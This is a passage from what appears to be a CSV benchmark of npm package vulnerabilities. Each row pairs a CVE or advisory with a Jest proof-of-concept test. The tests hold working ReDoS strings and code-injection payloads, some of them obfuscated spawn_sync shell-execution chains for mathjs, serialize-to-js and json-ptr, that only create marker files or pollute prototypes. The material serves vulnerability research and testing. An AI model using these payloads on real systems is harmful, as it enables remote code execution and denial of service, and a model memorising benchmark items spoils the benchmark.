      let time = t[0] + t[1] / 1000000000;
      expect(time).toBeGreaterThan(1);
    });
  stream.write(str1);
  stream.end();
});
",https://github.com/C2FO/fast-csv/commit/4bbd39f26a8cd7382151ab4f5fb102234b2f829e,Parser.js:69:64,https://security.snyk.io/vuln/SNYK-JS-FASTCSV-1049538; https://github.com/advisories/GHSA-8cv5-p934-3hwp
redos,CVE-2021-33502,normalize-url,6.0.0,6.0.1,redos/normalize-url_6.0.0,"test(""ReDos in parsejson"", () => {
  const measureTime = require(""../utils"").measureTime;
  const normalizeUrl = require(""normalize-url"");
  let t = measureTime(function () {
    try {
      normalizeUrl(""data:"" + "",#"".repeat(1000) + ""\nx"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103,index.js:12:68,https://security.snyk.io/vuln/SNYK-JS-NORMALIZEURL-1296539; https://github.com/advisories/GHSA-px4h-xg32-q955
redos,,dirty-json,0.4.0,0.5.2,redos/dirty-json_0.4.0,"test(""ReDoS in dirty-json"", () => {
  const dJSON = require(""dirty-json"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    dJSON.parse(`{ test: ""${""x"".repeat(24)}\\`);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/RyanMarcus/dirty-json/commit/0b9c15e26699538a11e08e0f168af558392dadbe,utils.js:391:28,https://security.snyk.io/vuln/npm:dirty-json:20180213; 
redos,CVE-2021-32640,ws,7.0.0,7.4.6,redos/ws_7.0.0,"test(""ReDos in ws"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const attack_str = ""b"" + "" "".repeat(42000) + ""x"";
  let t = measureTime(function () {
    attack_str.trim().split(/ *, */);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-WS-1296835; https://github.com/advisories/GHSA-6fc8-4gx4-v693
redos,CVE-2017-16113,parsejson,0.0.3,,redos/parsejson_0.0.3,"test(""ReDos in parsejson"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const parsejson = require(""parsejson"");
  let t = measureTime(function () {
    parsejson('{""a"":""' + genstr(50000, "" "") + '""}');
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:20:38,https://security.snyk.io/vuln/npm:parsejson:20170908; https://github.com/advisories/GHSA-q75g-2496-mxpp
redos,CVE-2021-29060,color-string,1.5.4,1.5.5,redos/color-string_1.5.4,"test(""ReDoS in color-string"", () => {
  const measureTime = require(""../utils"").measureTime;
  const colorString = require(""color-string"");
  let attack_str = ""hwb("" + ""1"".repeat(50000) + ""!"";
  let t = measureTime(function () {
    colorString.get(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/Qix-/color-string/commit/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,index.js:154:21,https://security.snyk.io/vuln/SNYK-JS-COLORSTRING-1082939; https://github.com/advisories/GHSA-257v-vj4p-3w2h
code-injection,,js-yaml,3.13.0,3.13.1,code-injection/js-yaml_3.13.0,"test(""Arbitrary code execution in js-yaml"", () => {
  expect.assertions(2);
  const payload =
    ""{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1"";
  const jsyaml = require(""js-yaml"");
  expect({}.polluted).toBe(undefined);
  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61,lib/js-yaml/type/js/function.js:70:12,https://security.snyk.io/vuln/SNYK-JS-JSYAML-174129; https://github.com/advisories/GHSA-xxvw-45rp-3mj2
code-injection,,mathjs,3.9.0,3.11.5,code-injection/mathjs_3.9.0,"test(""Arbitrary code execution in mathjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const math = require(""mathjs"");
  const path = ""./mathjs"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    math.eval(
      '[].map.constructor(""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));"")()'
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
code-injection,,@zhaoyao91/eval-in-vm,0.0.0,,code-injection/zhaoyao91-eval-in-vm_0.0.0,"test(""Arbitrary code execution in @zhaoyao91/eval-in-vm"", () => {
  expect.assertions(2);
  const eval1 = require(""@zhaoyao91/eval-in-vm"");
  expect({}.polluted).toBe(undefined);
  try {
    (""use strict"");
    const result = eval1(""1 + (this.constructor.prototype.polluted = `yes`);"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,eval-in-vm/index.js:11:6,https://github.com/advisories/GHSA-jp99-5h8w-gmxc; 
code-injection,CVE-2020-7640,pixl-class,1.0.0,1.0.3,code-injection/pixl-class_1.0.0,"test(""Arbitrary code execution in pixl-class"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""pixl-class"");
  const path = ""./pixl-class"";
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var members = {
    __parent:
      'function(){}; require(""fs"").writeFileSync(""./pixl-class"",""""); //}',
  };
  try {
    a.create(members);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8,class.js:26:4,https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968; https://github.com/advisories/GHSA-vm5j-vqr6-v7v8
code-injection,CVE-2020-15362,wifiscanner,1.0.1,,code-injection/wifiscanner_1.0.1,"test(""Arbitrary code execution in wifiscanner"", () => {
  expect.assertions(1);
  const fs = require(""fs"");
  let wifiscanner = require(""wifiscanner"");
  const sleep = require(""sleep"");
  const path = ""./wifiscanner.txt"";
  let options = {
    args: ""./wifiscanner.txt"",
    binaryPath: ""touch"",
  };
  try {
    let scanner = wifiscanner(options);
    scanner.scan(function (error, networks) {});
  } catch (error) {
    console.log(error);
  }
  sleep.sleep(2);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,scanners/wifiscanner.js:12:22,https://security.snyk.io/vuln/SNYK-JS-WIFISCANNER-574786; https://github.com/advisories/GHSA-m6rw-m2v9-7hx4
code-injection,CVE-2017-5954,serialize-to-js,^0.5.0,1.0.0,code-injection/serialize-to-js_0.5.0,"test(""Arbitrary code execution in serialize-to-js"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""serialize-to-js"");
  const path = ""./serialize-to-js"";
  let payload =
    ""{e: (function(){ spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`serialize-to-js`]));})() }"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    serialize.deserialize(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429,,https://security.snyk.io/vuln/npm:serialize-to-js:20170208; https://github.com/advisories/GHSA-mm62-wxc8-cf7m
code-injection,,mol-proto,^0.1.3,1.0.6,code-injection/mol-proto_0.1.3,"test(""Arbitrary code execution in mol-proto"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const mp = require(""mol-proto"");
  const path = ""./mol-proto"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mp.makeFunction(
      ""a"",
      ""b"",
      ""};require('fs').writeFileSync('./mol-proto', '');{""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/milojs/proto/pull/2/commits/10adbec293e7dfdb2e9e565bfd77187cf0373cbe,lib/proto_function.js:70:5,https://security.snyk.io/vuln/npm:mol-proto:20160407; 
code-injection,,m-log,0.0.1,,code-injection/m-log_0.0.1,"test(""Arbitrary code execution in m-log"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const log = require(""m-log"");
  const path = ""./m-log"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    log.setColorTheme({
      silly: 'yellow""}); require(`fs`).writeFileSync(`m-log`,``); 23//',
    });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/m-prj/m-log/pull/1/commits/ee1a08f25555201001dee497addeae9d1705226a,libs/log.js:24:11,https://security.snyk.io/vuln/npm:m-log:20160408; 
code-injection,CVE-2021-23594,realms-shim,1.1.0,,code-injection/realms-shim_1.1.0,"test(""Arbitrary code execution in realms-shim"", () => {
  expect.assertions(2);
  let Realm = require(""realms-shim"");
  const r = Realm.makeRootRealm();
  expect({}.polluted).toBe(undefined);
  try {
    r.evaluate(`let HostException;
          try{
               (0, eval)('--'+'>');
          }catch(e){
               HostException = e;
          }
          const HostObject = HostException.__proto__.__proto__.__proto__;
          HostObject.polluted = 'yes';
          `);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,src/evaluators.js:60:26,https://security.snyk.io/vuln/SNYK-JS-REALMSSHIM-2309907; https://github.com/advisories/GHSA-7cg8-pq9v-x98q
code-injection,,marsdb,0.6.11,,code-injection/marsdb_0.6.11,"test(""Arbitrary code execution in marsdb"", () => {
  expect.assertions(2);
  let Collection = require(""marsdb"").Collection;
  expect({}.polluted).toBe(undefined);
  const posts = new Collection(""posts"", { inMemory: true });
  // try {
  //     let val = posts.insert({ text: 'MarsDB is awesome' });
  //     return val.then(docId => {
  //         let out = posts.find({ $where: '(Object.prototype.polluted=`yes`)' });
  //         out.then(docs => {
  //             expect({}.polluted).toBe('yes');
  //         });
  //     });
  // } catch (e) {
  // }

  return posts.insert({ text: ""MarsDB is awesome"" }).then((docId) => {
    return posts
      .find({ $where: ""(Object.prototype.polluted=`yes`)"" })
      .then((docs) => {
        expect({}.polluted).toBe(""yes"");
      });
  });
});
",,dist/DocumentMatcher.js:419:23,https://security.snyk.io/vuln/SNYK-JS-MARSDB-480405; https://github.com/advisories/GHSA-5mrr-rgp6-x4gr
code-injection,CVE-2020-28464,djv,2.0.0,2.1.4,code-injection/djv_2.0.0,"test(""Arbitrary code execution in  djv"", () => {
  expect.assertions(2);
  const djv = require(""djv"");
  expect({}.polluted).toBe(undefined);
  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{""common"":{""type"":""array"", ""minItems"":""1 + (Object.prototype.polluted = `yes`)""}}'
    );
    env.addSchema(""test"", evilSchema);
    env.validate(""test#/common"", { type: ""custom"" });
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,lib/utils/template.js:110:15,https://github.com/advisories/GHSA-4hv7-3q38-97m8; https://security.snyk.io/vuln/SNYK-JS-DJV-1014545
code-injection,CVE-2020-7766,json-ptr,2.0.0,2.0.0,code-injection/json-ptr_2.0.0,"test(""Arbitrary code execution in json-ptr"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const jptr = require(""json-ptr"");
  const path = ""./json-ptr"";
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);  
  JsonPointer = jptr.JsonPointer;
  try {
    let customSpawn = 'spawn_sync = process.binding(`spawn_sync`);normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};';
    JsonPointer.get(
      {},      
      `/aaa'])) !== 'undefined') {return it;}; ${customSpawn}; spawnSync(""touch"",[""json-ptr""]); if(((['a`
    );
  } catch (error) {
    console.log(""err===>"", error);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,src/util.ts:155:10,https://github.com/advisories/GHSA-x5r6-x823-9848; https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1016939
code-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,code-injection/hot-formula-parser_3.0.0,"test(""Arbitrary code execution in hot-formula-parser"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const FormulaParser = require(""hot-formula-parser"").Parser;
  const path = ""./hot-formula-parser"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let parser = new FormulaParser();
    parser.parse(
      ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
code-injection,,open,0.0.5,6.0.0,code-injection/open_0.0.5,"test(""Arbitrary code execution in open"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./open"";
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    require(""open"")('""""`touch open`', () => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      if (file_exist) fs.unlinkSync(path);
      done();
    });
  } catch (error) {}
});
",,lib/open.js:58:10,https://security.snyk.io/vuln/SNYK-JS-OPEN-174041; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
code-injection,CVE-2020-7660,serialize-javascript,2.0.0,3.1.0,code-injection/serialize-javascript_2.0.0,"test(""Arbitrary code execution in serialize-javascript"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""serialize-javascript"");
  const path = ""./serialize-javascript"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  eval(
    ""("" +
      serialize({
        str:
          ""string"" +
          this.constructor
            .constructor(`return process`)()
            .mainModule.require(`fs`)
            .writeFileSync(`serialize-javascript`, ``),
      }) +
      "")""
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd,,https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062; https://github.com/advisories/GHSA-hxcc-f52p-wc94
code-injection,,is-my-json-valid,2.20.0,2.20.3,code-injection/is-my-json-valid_2.20.0,"test(""Arbitrary code execution in is-my-json-valid"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const validator = require(""is-my-json-valid"");
  const path = ""./is-my-json-valid"";
  const sleep = require(""sleep"");
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);
  const schema = {
    type: ""object"",
    properties: {
      ""x[1 + (Object.prototype.polluted='yes')]"": {
        required: true,
        type: ""string"",
      },
    },
  };
  try {
    let validate = validator(schema);
    validate({});
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(""yes"");
  fs.unlink(path, function (err) {});
});
",https://github.com/mafintosh/is-my-json-valid/commit/3419563687df463b4ca709a2b46be8e15d6a2b3d,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597167; https://github.com/advisories/GHSA-f522-ffg8-j8r6
code-injection, CVE-2020-7710,safe-eval,0.2.0,,code-injection/safe-eval_0.2.0,"test(""Arbitrary code execution in safe-eval"", () => {
  expect.assertions(2);
  var safeEval = require(""safe-eval"");
  expect({}.polluted).toBe(undefined);
  try {
    safeEval(""this.constructor.prototype.polluted=`yes`"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,index.js:13:6,https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-608076; https://github.com/advisories/GHSA-hrpq-r399-whgw
code-injection,,static-eval,1.1.1,2.0.2,code-injection/static-eval_1.1.1,"test(""Arbitrary code execution in static-eval"", () => {
  expect.assertions(2);
  const evaluate = require(""static-eval"");
  const parse = require(""esprima"").parse;
  expect({}.polluted).toBe(undefined);
  let src = ""(function(){1 + (Object.prototype.polluted = `yes`)}())"";
  try {
    let ast = parse(src).body[0].expression;
    let res = evaluate(ast, {});
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/browserify/static-eval/commit/32f8efd072625e267aa7237d2daff35738c50d2a,index.js:118:20,https://security.snyk.io/vuln/SNYK-JS-STATICEVAL-173693; https://github.com/advisories/GHSA-8v27-2fg9-7h62
code-injection,,mongoosemask,0.0.6,,code-injection/mongoosemask_0.0.6,"test(""Arbitrary code execution in mongoosemask"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const mask = require(""mongoosemask"");
  const path = ""./mongoosemask"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mask.mask({}, [
      'id""]; require(`fs`)[""writeFileSync""](`mongoosemask`,``)//',
    ]);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:181:5,https://security.snyk.io/vuln/npm:mongoosemask:20160408; 
code-injection,CVE-2017-5941,node-serialize,0.0.3,,code-injection/node-serialize_0.0.3,"test(""Arbitrary code execution in node-serialize"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""node-serialize"");
  const path = ""./node-serialize"";
  let payload =
    '{""rce"":""_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()""}';
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    serialize.unserialize(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/serialize.js:75:22,https://security.snyk.io/vuln/npm:node-serialize:20170208; https://github.com/advisories/GHSA-q4v7-4rhw-9hqm
code-injection,,veval,1.0.0,,code-injection/veval_1.0.0,"test(""Arbitrary code execution in veval"", () => {
  expect.assertions(2);
  const ve = require(""veval"");
  expect({}.polluted).toBe(undefined);
  try {
    ve({ hi: 0 }, ""1 + (this.constructor.prototype.polluted = `yes`);"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,index.js:13:21,https://github.com/advisories/GHSA-54qm-37qr-w5wq; 
code-injection,,mathjs,3.10.3,3.11.5,code-injection/mathjs_3.10.3,"test(""Arbitrary code execution in mathjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const math = require(""mathjs"");
  const path = ""./mathjs"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    math.eval(
      'import({matrix:cos.constructor},{override:1});x=[""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));""];x()'
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
code-injection,CVE-2020-7674,access-policy,3.1.0,,code-injection/access-policy_3.1.0,"test(""Arbitrary code execution in access-policy"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  let a = require(""access-policy"");
  const path = ""./access-policy"";
  let statements = ""`; require(`fs`).writeFileSync(`"" + path + ""`,``);//"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.encode(statements, data);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/encode.js:6:10,https://security.snyk.io/vuln/SNYK-JS-ACCESSPOLICY-571490; https://github.com/advisories/GHSA-fw2f-7f87-5r6c
code-injection,CVE-2020-7673,node-extend,^0.2.0,,code-injection/node-extend_0.2.0,"test(""Arbitrary code execution in node-extend"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const extend = require(""node-extend"");
  const path = ""./node-extend"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    foo = extend(
      ""function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}"",
      """"
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/extend.js:31:11,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-571491; https://github.com/advisories/GHSA-cg42-4wrc-gp47
code-injection,CVE-2016-10548,reduce-css-calc,1.2.0,1.2.5,code-injection/reduce-css-calc_1.2.0,"test(""Arbitrary code execution in reduce-css-calc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const reduceCSSCalc = require(""reduce-css-calc"");
  const path = ""./reduce-css-calc"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
    console.log(
      reduceCSSCalc(
        `calc(                       (global['fs'] = require('fs')))`
      )
    );
    console.log(
      reduceCSSCalc(
        `calc(                       (fs['writeFileSync'](""reduce-css-calc"", """")))`
      )
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:73:16,https://security.snyk.io/vuln/npm:reduce-css-calc:20160913; https://github.com/advisories/GHSA-4662-j96g-mv46
code-injection,,value-censorship,1.1.0,,code-injection/value-censorship_1.1.0,"test(""Arbitrary code execution in  value-censorship"", () => {
  expect.assertions(2);
  const censor = require(""value-censorship"");
  expect({}.polluted).toBe(undefined);
  try {
    censor(`
        ;1 +(Object.prototype.polluted = 'yes')//
        `);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,index.js:22:19,https://github.com/advisories/GHSA-xrr6-6ww3-f3qm; 
code-injection,CVE-2020-7672,mosc,1.0.0,,code-injection/mosc_1.0.0,"test(""Arbitrary code execution in mosc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  var A = require(""mosc"");
  expect({}.polluted).toBe(undefined);
  let a = new A({});
  let key = """";
  let attack_code = ""1 + (Object.prototype.polluted = `yes`)"";
  let properties = ""{a:*1*; "" + attack_code + "" //*}"";
  let base = """";
  try {
    a.parse_properties(key, properties, {}, {});
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,mosc.js:50:43,https://security.snyk.io/vuln/SNYK-JS-MOSC-571492; https://github.com/advisories/GHSA-j665-rvj7-2jv9
code-injection,,mixin-pro,0.6.0,0.6.7,code-injection/mixin-pro_0.6.0,"test(""Arbitrary code execution in mixin-pro"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const Class = require(""mixin-pro"").createClass;
  const path = ""./mixin-pro"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {      
      function Foo() { }
      Object.defineProperty(Foo, ""name"", {
        enumerable: false,
        configurable: false,
        writable: true,
        value: 'static'
      });
      Foo.name = ""test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor""
      let Bar1 = Class(Foo, { constructor: Foo });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
